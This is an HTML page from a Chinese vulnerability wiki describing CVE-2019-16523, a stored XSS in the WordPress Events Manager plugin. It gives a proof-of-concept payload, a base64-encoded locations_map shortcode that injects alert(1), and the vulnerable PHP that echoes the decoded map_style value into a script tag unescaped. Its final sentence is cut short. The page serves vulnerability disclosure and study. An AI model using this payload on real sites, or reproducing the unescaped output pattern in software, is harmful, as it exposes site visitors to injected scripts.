<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2019-16523%EF%BC%89WordPress%20Plugin%20-%20Events%20Manager%20%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/">
    <link rel="shortcut icon" href="../../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2019-16523）WordPress Plugin - Events Manager 储存型xss - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2019-16523\uff09WordPress Plugin - Events Manager \u50a8\u5b58\u578bxss", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="../../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-19133%EF%BC%89WordPress%20Plugin%20-%20CSS%20Hero%204.0.3%20%E5%8F%8D%E5%B0%84xss/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-19133%EF%BC%89WordPress%20Plugin%20-%20CSS%20Hero%204.0.3%20%E5%8F%8D%E5%B0%84xss/" class="btn btn-xs btn-link">
        （CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-16522%EF%BC%89WordPress%20Plugin%20-%20EU%20Cookie%20Law%20%28GDPR%29%20%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-16522%EF%BC%89WordPress%20Plugin%20-%20EU%20Cookie%20Law%20%28GDPR%29%20%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="btn btn-xs btn-link">
        （CVE-2019-16522）WordPress Plugin - EU Cookie Law (GDPR) 储存型xss
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2019-16523wordpress-plugin-events-manager-xss">（CVE-2019-16523）WordPress Plugin - Events Manager 储存型xss<a class="headerlink" href="#cve-2019-16523wordpress-plugin-events-manager-xss" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>WordPress的5.9.5版以上的事件管理器插件（又名"事件管理器"）容易受到存储的XSS的影响，这是由于编码不正确和插入提供给该插件提供的短码属性map_style（locations_map和events_map）的数据所致。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>wordpress \&lt;= 5.9.5</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="1">1、利用过程<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
<p>要利用此漏洞，攻击者需要创建或编辑帖子并插入上面提到的短代码之一。在此示例中，我们使用locations_map简码并将属性设置
map_style为的base64编码值</p>
<div class="codehilite"><pre><span></span><code>{&quot;a&quot;:&quot;test\&quot;<span class="nt">&lt;/script&gt;&lt;script&gt;</span>alert(1)<span class="nt">&lt;/script&gt;</span>&quot;}。
</code></pre></div>

<p>这将导致以下简码：</p>
<div class="codehilite"><pre><span></span><code>[locations_map test=&quot;&quot; map_style=&quot;eyJhIjoidGVzdFwiPC9zY3JpcHQ+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiJ9Cg==&quot;]
</code></pre></div>

<p>然后可以将该短代码插入到帖子中，然后由恶意用户发布。任何访问该职位的人都会受到有效载荷的影响，因此是XSS攻击的受害者。</p>
<h3 id="2">2、详细分析<a class="headerlink" href="#2" title="Permanent link">&para;</a></h3>
<p>Events
Manager插件提供了用于创建地图小部件的短代码，例如用于显示事件的位置。通过map_style使用简码中的属性提供自定义样式，可以直观地调整这些地图。为了防止XSS
，在shortcode属性内使用HTML
受到限制。但是，在这种情况下，可以注入任意HTML和JavaScript，因为该
map_style属性需要一个以base64编码的JSON对象。这允许绕过消毒。简码locations_map和events_map受此问题影响：</p>
<p>在em-shortcode.php（第43-56行），我们可以看到该属性是经过base64解码的，然后使用json_decode进行了解析。如果JSON语法有效，则将删除空格并将对象作为map_json_style变量传递到模板。请参见下面的代码段：</p>
<div class="codehilite"><pre><span></span><code><span class="c1">//add JSON style to map</span>
<span class="no">$</span><span class="n">style</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="w"> </span>!<span class="n">empty</span><span class="p">(</span><span class="no">$</span><span class="n">args</span><span class="p">[</span><span class="s">&#39;map_style&#39;</span><span class="p">])</span><span class="w"> </span><span class="p">){</span>
<span class="w">    </span><span class="no">$</span><span class="n">style</span><span class="p">=</span><span class="w"> </span><span class="n">base64_decode</span><span class="p">(</span><span class="no">$</span><span class="n">args</span><span class="p">[</span><span class="s">&#39;map_style&#39;</span><span class="p">]);</span>
<span class="w">    </span><span class="no">$</span><span class="n">style_json</span><span class="p">=</span><span class="w"> </span><span class="n">json_decode</span><span class="p">(</span><span class="no">$</span><span class="n">style</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="w"> </span><span class="n">is_array</span><span class="p">(</span><span class="no">$</span><span class="n">style_json</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">is_object</span><span class="p">(</span><span class="no">$</span><span class="n">style_json</span><span class="p">)</span><span class="w"> </span><span class="p">){</span>
<span class="w">        </span><span class="no">$</span><span class="n">style</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">preg_replace</span><span class="p">(</span><span class="s">&#39;/[\r\n\t\s]/&#39;</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="no">$</span><span class="n">style</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">        </span><span class="no">$</span><span class="n">style</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">unset</span><span class="p">(</span><span class="no">$</span><span class="n">args</span><span class="p">[</span><span class="s">&#39;map_style&#39;</span><span class="p">]);</span>
<span class="p">}</span>
<span class="n">ob_start</span><span class="p">();</span>
<span class="n">em_locate_template</span><span class="p">(</span><span class="s">&#39;templates/map-global.php&#39;</span><span class="p">,</span><span class="n">true</span><span class="p">,</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s">&#39;args&#39;</span><span class="p">=</span><span class="o">&gt;</span><span class="no">$</span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;map_json_style&#39;</span><span class="w"> </span><span class="p">=</span><span class="o">&gt;</span><span class="w"> </span><span class="no">$</span><span class="n">style</span><span class="p">));</span>
</code></pre></div>

<p>在templates/templates/map-global.php（第16-21行）中，变量无需进一步编码即可插入脚本标签内：</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;script</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
<span class="w">    </span>if(<span class="w"> </span>typeof<span class="w"> </span>EM<span class="w"> </span>==<span class="w"> </span>&#39;object&#39;){
<span class="w">        </span>if(<span class="w"> </span>typeof<span class="w"> </span>EM.google_map_id_styles<span class="w"> </span>!=<span class="w"> </span>&#39;object&#39;<span class="w"> </span>)<span class="w"> </span>EM.google_map_id_styles<span class="w"> </span>=<span class="w"> </span>[];
<span class="w">        </span>EM.google_map_id_styles[&#39;<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;random_id&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span>&#39;]<span class="w"> </span>=<span class="w"> </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$map_json_style</span><span class="p">;</span> <span class="cp">?&gt;</span>;
<span class="w">    </span>}
<span class="nt">&lt;/script&gt;</span>
</code></pre></div>

<p>这样就完美的构成了x</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-19133%EF%BC%89WordPress%20Plugin%20-%20CSS%20Hero%204.0.3%20%E5%8F%8D%E5%B0%84xss/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-19133%EF%BC%89WordPress%20Plugin%20-%20CSS%20Hero%204.0.3%20%E5%8F%8D%E5%B0%84xss/" class="btn btn-xs btn-link">
        （CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-16522%EF%BC%89WordPress%20Plugin%20-%20EU%20Cookie%20Law%20%28GDPR%29%20%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-16522%EF%BC%89WordPress%20Plugin%20-%20EU%20Cookie%20Law%20%28GDPR%29%20%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="btn btn-xs btn-link">
        （CVE-2019-16522）WordPress Plugin - EU Cookie Law (GDPR) 储存型xss
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>